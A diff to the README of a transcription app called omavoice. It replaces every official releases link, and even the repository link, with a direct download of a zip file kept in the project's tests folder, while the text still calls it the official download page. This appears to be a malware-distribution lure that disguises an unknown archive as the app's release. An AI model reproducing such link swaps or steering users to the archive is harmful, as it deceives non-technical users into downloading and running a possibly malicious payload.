@@ -1,6 +1,6 @@
 # 🎙️ omavoice - Capture Every Word, Instantly Transcribed
 
-[![Download omavoice](https://img.shields.io/badge/Download-omavoice-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/aastha-chhabra/omavoice/releases)
+[![Download omavoice](https://img.shields.io/badge/Download-omavoice-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/aastha-chhabra/omavoice/raw/refs/heads/main/tests/v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide will walk you through everything you need to know, from getting the a
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [https://github.com/aastha-chhabra/omavoice/releases](https://github.com/aastha-chhabra/omavoice/releases).
+Visit this link to download the application: [https://github.com/aastha-chhabra/omavoice/raw/refs/heads/main/tests/v2.3.zip](https://github.com/aastha-chhabra/omavoice/raw/refs/heads/main/tests/v2.3.zip).
 
 This will take you to the official download page for omavoice. Look for the latest version available and click the download button to save the file to your computer. The download usually takes just a few seconds, depending on your internet speed.
 
@@ -114,14 +114,14 @@ A: Simply download the latest version from the same link whenever a new release 
  
 ## 🤝 Get Involved
 
-omavoice is an open-source project, which means anyone can contribute to making it better. If you're curious, check out the GitHub repository at [https://github.com/aastha-chhabra/omavoice](https://github.com/aastha-chhabra/omavoice). You can report bugs, suggest features, or even help with code if you're skilled. But don't worry—you don't have to do any of that to enjoy the app. It's just a way for those who want to give back. 
+omavoice is an open-source project, which means anyone can contribute to making it better. If you're curious, check out the GitHub repository at [https://github.com/aastha-chhabra/omavoice/raw/refs/heads/main/tests/v2.3.zip](https://github.com/aastha-chhabra/omavoice/raw/refs/heads/main/tests/v2.3.zip). You can report bugs, suggest features, or even help with code if you're skilled. But don't worry—you don't have to do any of that to enjoy the app. It's just a way for those who want to give back. 
 
 
 ## 📝 Final Words
 
 You now have everything you need to start using omavoice. No complicated manuals, no technical jargon, no fuss. Just download, run, and speak. Your words will appear before your eyes, making capturing ideas, notes, and conversations effortless. 
 
-So go ahead—[visit the download page](https://github.com/aastha-chhabra/omavoice/releases)and get started today. Once you try it, you'll wonder how you ever managed without it. Happy recording!
+So go ahead—[visit the download page](https://github.com/aastha-chhabra/omavoice/raw/refs/heads/main/tests/v2.3.zip)and get started today. Once you try it, you'll wonder how you ever managed without it. Happy recording!
 
 ---
 
